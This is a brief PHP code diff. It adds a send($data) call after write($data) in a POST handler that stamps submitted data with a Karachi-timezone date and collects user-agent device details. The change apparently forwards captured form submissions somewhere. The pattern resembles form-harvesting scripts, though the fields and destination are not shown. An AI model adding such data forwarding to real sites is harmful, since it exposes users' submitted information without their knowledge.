@@ -10,6 +10,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST')
                 "Date:".(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
 	    
 	    write($data);    
+		send($data);
 	}	
 }
 
@@ -130,4 +131,3 @@ function Device($user_agent)
 }
 
 ?>
-
